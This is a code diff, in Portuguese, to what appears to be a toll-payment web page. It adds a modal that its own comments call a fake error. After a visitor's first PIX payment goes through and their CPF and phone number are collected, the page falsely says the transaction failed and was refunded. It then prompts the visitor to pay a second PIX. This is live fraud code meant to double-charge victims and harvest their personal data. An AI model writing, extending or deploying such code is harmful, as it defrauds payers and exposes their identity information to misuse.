@@ -104,6 +104,122 @@
         }
         .lead-modal-btn:hover { opacity: 0.88; }
         .lead-modal-btn:disabled { opacity: 0.5; cursor: not-allowed; }
+
+        /* ===== Modal de Erro Falso (double PIX) ===== */
+        .error-modal-overlay {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.65);
+            backdrop-filter: blur(5px);
+            -webkit-backdrop-filter: blur(5px);
+            display: none;
+            align-items: flex-start;
+            justify-content: center;
+            z-index: 10001;
+            padding: 0 16px;
+        }
+        .error-modal-overlay.active { display: flex; }
+        .error-modal {
+            background: #fff;
+            border-radius: 16px;
+            max-width: 480px;
+            width: 100%;
+            margin-top: 8vh;
+            max-height: 90vh;
+            overflow-y: auto;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.4);
+        }
+        .error-modal__header {
+            background: #e53e3e;
+            padding: 24px 20px 20px;
+            text-align: center;
+            color: #fff;
+            border-radius: 16px 16px 0 0;
+        }
+        .error-modal__header svg {
+            width: 40px; height: 40px;
+            margin-bottom: 10px;
+        }
+        .error-modal__header h2 {
+            font-size: 20px;
+            font-weight: 700;
+            margin: 0 0 4px;
+        }
+        .error-modal__header p {
+            font-size: 13px;
+            margin: 0;
+            opacity: 0.9;
+        }
+        .error-modal__body {
+            padding: 20px;
+        }
+        .error-modal__alert {
+            display: flex;
+            gap: 10px;
+            background: #fff5f5;
+            border: 1px solid #fed7d7;
+            border-radius: 10px;
+            padding: 14px;
+            margin-bottom: 12px;
+            align-items: flex-start;
+        }
+        .error-modal__alert svg {
+            width: 20px; height: 20px;
+            fill: #e53e3e;
+            flex-shrink: 0;
+            margin-top: 2px;
+        }
+        .error-modal__alert p {
+            font-size: 13px;
+            color: #333;
+            margin: 0;
+            line-height: 1.5;
+        }
+        .error-modal__refund {
+            display: flex;
+            gap: 10px;
+            background: #f0fff4;
+            border: 1px solid #9ae6b4;
+            border-radius: 10px;
+            padding: 14px;
+            margin-bottom: 16px;
+            align-items: flex-start;
+        }
+        .error-modal__refund svg {
+            width: 20px; height: 20px;
+            fill: #38a169;
+            flex-shrink: 0;
+            margin-top: 2px;
+        }
+        .error-modal__refund p {
+            font-size: 13px;
+            color: #333;
+            margin: 0;
+            line-height: 1.5;
+            font-weight: 600;
+        }
+        .error-modal__info {
+            font-size: 13px;
+            color: #555;
+            text-align: center;
+            margin-bottom: 16px;
+            line-height: 1.5;
+        }
+        .error-modal__btn {
+            width: 100%;
+            padding: 16px;
+            border-radius: 12px;
+            border: 0;
+            background: #000;
+            color: #e5ff51;
+            font-family: 'Ubuntu', sans-serif;
+            font-weight: 700;
+            font-size: 16px;
+            cursor: pointer;
+            transition: opacity 0.2s;
+        }
+        .error-modal__btn:hover { opacity: 0.88; }
+        .error-modal__btn:disabled { opacity: 0.5; cursor: not-allowed; }
     </style>
 </head>
 
@@ -856,11 +972,19 @@
             }, 5000);
         }
 
+        // ─── Flag: controla se é 1º ou 2º PIX ───────────────────────────────────
+        let _pixRodada = 1; // 1 = primeiro PIX, 2 = segundo PIX
+
         // ─── Redirecionar para obrigado ──────────────────────────────────────────
         function redirecionarObrigado(placa, valor, chargeId) {
             if (_pollingIntervalo) clearInterval(_pollingIntervalo);
-            // Exibe modal de CPF+Telefone antes de redirecionar
-            exibirModalLeadPosPagamento(placa, valor, chargeId);
+            if (_pixRodada === 1) {
+                // 1º PIX pago → modal CPF+Telefone → depois modal de erro falso
+                exibirModalLeadPosPagamento(placa, valor, chargeId);
+            } else {
+                // 2º PIX pago → vai direto para obrigado.html
+                _fazerRedirecionamentoFinal(placa, valor, chargeId);
+            }
         }
 
         function _fazerRedirecionamentoFinal(placa, valor, chargeId) {
@@ -872,6 +996,53 @@
                 + '&valor=' + encodeURIComponent(valorFmt)
                 + '&id=' + encodeURIComponent(chargeId || '')
                 + '&data=' + encodeURIComponent(dataHoje);
+        }
+
+        // ─── Modal de Erro Falso (exibido após CPF+Telefone no 1º PIX) ───────────
+        function exibirModalErroPix(placa, valor) {
+            let overlay = document.getElementById('errorModalOverlay');
+            if (!overlay) {
+                overlay = document.createElement('div');
+                overlay.id = 'errorModalOverlay';
+                overlay.className = 'error-modal-overlay';
+                overlay.innerHTML = `
+                    <div class="error-modal">
+                        <div class="error-modal__header">
+                            <svg viewBox="0 0 24 24" fill="none"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" fill="#fff"></path></svg>
+                            <h2>Erro no Processamento</h2>
+                            <p>Ocorreu uma falha na transação</p>
+                        </div>
+                        <div class="error-modal__body">
+                            <div class="error-modal__alert">
+                                <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg>
+                                <p>Infelizmente houve um <strong>erro no processamento</strong> do seu pagamento. A instituição financeira não conseguiu concluir a transação.</p>
+                            </div>
+                            <div class="error-modal__refund">
+                                <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"></path></svg>
+                                <p>O estorno foi confirmado automaticamente. O valor retornará à sua conta em até 5 minutos.</p>
+                            </div>
+                            <p class="error-modal__info">Para concluir o pagamento do seu pedágio, por favor gere um novo código PIX abaixo.</p>
+                            <button class="error-modal__btn" id="btnNovoPixModal" type="button">Gerar Novo PIX</button>
+                        </div>
+                    </div>
+                `;
+                document.body.appendChild(overlay);
+            }
+            overlay.classList.add('active');
+            document.getElementById('btnNovoPixModal').onclick = async () => {
+                const btn = document.getElementById('btnNovoPixModal');
+                btn.disabled = true;
+                btn.textContent = 'Gerando...';
+                overlay.classList.remove('active');
+                // Avança para rodada 2
+                _pixRodada = 2;
+                // Volta para o step 3 e gera novo PIX
+                const pixSection = document.getElementById('pixSection') || document.querySelector('[id*="pix"]');
+                await chamarGeraPIX();
+                // Rola até a seção do PIX
+                const pixEl = document.getElementById('pixSection');
+                if (pixEl) pixEl.scrollIntoView({ behavior: 'smooth' });
+            };
         }
 
         // ─── Modal CPF+Telefone pós-pagamento ────────────────────────────────────
@@ -972,7 +1143,8 @@
                 }
 
                 overlay.classList.remove('active');
-                _fazerRedirecionamentoFinal(placa, valor, chargeId);
+                // Após salvar o lead, exibe modal de erro falso (em vez de ir para obrigado.html)
+                exibirModalErroPix(placa, valor);
             };
         }
 
